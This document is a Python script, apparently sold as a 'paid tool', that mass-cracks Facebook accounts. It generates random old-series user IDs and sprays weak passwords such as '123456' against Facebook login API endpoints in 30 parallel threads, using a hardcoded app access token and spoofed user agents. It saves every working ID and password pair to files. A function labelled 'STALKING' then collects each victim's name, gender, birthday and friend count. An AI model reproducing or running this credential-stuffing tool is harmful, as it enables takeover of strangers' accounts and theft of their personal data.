# -*- coding: utf-8 -*-
import os, sys, time, random, uuid, requests
from concurrent.futures import ThreadPoolExecutor as tred

# Globals
oks = []
loop = 0
W = '\x1b[1;37m'
G = '\x1b[38;5;46m'
Y = '\x1b[38;5;220m'
rad = '\x1b[38;5;196m'

# --- UTILITIES ---
def clear(): os.system('clear')
def linex(): print('\x1b[38;5;48m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
def window1(): return f"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.{random.randint(10,20)} (KHTML, like Gecko) Chrome/{random.randint(8,12)}.0.552.0 Safari/534.{random.randint(10,20)}"

def ____banner____():
    clear()
    print("""
\033[1;32m
    x404notfound - paid tools
\033[0m""")

def creationyear(uid):
    if len(uid) == 15:
        if uid.startswith('1000000'): return '2009'
        if uid.startswith('1000006'): return '2010'
        if uid.startswith(('100002','100003')): return '2011'
        if uid.startswith('100004'): return '2012'
        if uid.startswith(('100005','100006')): return '2013'
        if uid.startswith(('100007','100008')): return '2014'
        if uid.startswith('100009'): return '2015'
        if uid.startswith('10001'): return '2016'
        if uid.startswith('10002'): return '2017'
        if uid.startswith('10003'): return '2018'
        if uid.startswith('10004'): return '2019'
        if uid.startswith('10005'): return '2020'
        if uid.startswith('10006'): return '2021'
        if uid.startswith('10009'): return '2023'
        if uid.startswith(('10007','10008')): return '2022'
        return ''
    elif len(uid) in (9,10): return '2008'
    elif len(uid) == 8: return '2007'
    elif len(uid) == 7: return '2006'
    elif len(uid) == 14 and uid.startswith('61'): return '2024'
    else: return ''

# --- GRAPH API STALKING ---
def fetch_graph(uid, token='350685531728|62f8ce9f74b12f84c123cc23437a4a32'):
    try:
        r = requests.get(f'https://graph.facebook.com/{uid}?access_token={token}').json()
        name = r.get('name','N/A')
        birthday = r.get('birthday','N/A')
        gender = r.get('gender','N/A')
        friends = r.get('friends', {}).get('summary', {}).get('total_count','N/A')
        log_line = f"{G}[STALK] {uid} | Name:{name} | Gender:{gender} | Birthday:{birthday} | Friends:{friends}"
        print(log_line)
        with open('/sdcard/XXX-CRACK-INFO.txt', 'a') as f:
            f.write(f"{uid}|{name}|{gender}|{birthday}|{friends}\n")
    except Exception as e:
        print(f"{rad}[STALK FAIL] {uid} | {e}")

# --- LOGIN METHODS ---
def login_1(uid):
    global loop
    session = requests.Session()
    for pw in ('123456','1234567','12345678','123456789'):
        try:
            data = {
                'email': str(uid),
                'password': str(pw),
                'access_token':'350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                'format':'json'
            }
            res = session.post('https://b-graph.facebook.com/auth/login', data=data, headers={'User-Agent': window1()}).json()
            if 'session_key' in res:
                print(f"{G}[OK-M1] {uid} | {pw} | {creationyear(uid)}")
                oks.append(uid)
                with open('/sdcard/XXX-CRACK-M1-OK.txt','a') as f:
                    f.write(f"{uid}|{pw}\n")
                fetch_graph(uid)
                break
        except: continue
    loop +=1
    print_progress()

def login_2(uid):
    global loop
    for pw in ('123456','123123','1234567','12345678','123456789'):
        try:
            url = f"https://b-api.facebook.com/method/auth.login?format=json&email={uid}&password={pw}&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&locale=en_US&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32"
            r = requests.get(url, headers={'User-Agent': window1()}).json()
            if 'session_key' in str(r):
                print(f"{G}[OK-M2] {uid} | {pw} | {creationyear(uid)}")
                oks.append(uid)
                with open('/sdcard/XXX-CRACK-M2-OK.txt','a') as f:
                    f.write(f"{uid}|{pw}\n")
                fetch_graph(uid)
                break
        except: continue
    loop +=1
    print_progress()

def print_progress():
    print(f"{Y}[INFO] Total OK: {len(oks)} | Loop: {loop}")

# --- OLD CLONE MENU ---
def BNG_71_():
    ____banner____()
    print('(\x1b[1;37mA\x1b[38;5;196m) OLD CLONE')
    linex()
    choice = input(f"CHOICE {W}: {Y}")
    if choice.lower() in ('a','1'):
        old_clone()
    else:
        print(f"{rad}Choose Valid Option... ")
        time.sleep(2)
        BNG_71_()

def old_clone():
    ____banner____()
    print('(A) ALL SERIES\n(B) 100003/4 SERIES\n(C) 2009 series')
    linex()
    _input = input(f"CHOICE {W}: {Y}")
    if _input.lower() in ('a','1'): old_One()
    elif _input.lower() in ('b','2'): old_Tow()
    elif _input.lower() in ('c','3'): old_Tree()
    else:
        print(f"{rad}Choose Valid Option...")
        time.sleep(2)
        old_clone()

# --- ID GENERATORS ---
def old_One():
    user=[]
    ____banner____()
    limit=int(input("Enter number of IDs to fetch (old 2010-2014): "))
    for _ in range(limit):
        user.append(str(random.randint(1000000000,1999999999)))
    meth=input("Choose method A/B: ").strip().upper()
    print(f"{Y}[INFO] Starting cracking with {len(user)} IDs using method {meth}")
    with tred(max_workers=30) as pool:
        for uid in user:
            if meth=='A': pool.submit(login_1, uid)
            else: pool.submit(login_2, uid)

def old_Tow():
    user=[]
    ____banner____()
    limit=int(input("Enter number of IDs to fetch (100003/100004): "))
    prefixes=['100003','100004']
    for _ in range(limit):
        user.append(random.choice(prefixes)+''.join(random.choices('0123456789',k=9)))
    meth=input("Choose method A/B: ").strip().upper()
    print(f"{Y}[INFO] Starting cracking with {len(user)} IDs using method {meth}")
    with tred(max_workers=30) as pool:
        for uid in user:
            if meth=='A': pool.submit(login_1, uid)
            else: pool.submit(login_2, uid)

def old_Tree():
    user=[]
    ____banner____()
    limit=int(input("Enter number of IDs to fetch (2009 series): "))
    prefix='1000004'
    for _ in range(limit):
        user.append(prefix+''.join(random.choices('0123456789',k=8)))
    meth=input("Choose method A/B: ").strip().upper()
    print(f"{Y}[INFO] Starting cracking with {len(user)} IDs using method {meth}")
    with tred(max_workers=30) as pool:
        for uid in user:
            if meth=='A': pool.submit(login_1, uid)
            else: pool.submit(login_2, uid)

# --- START ---
if __name__=='__main__':
    ____banner____()
    BNG_71_()
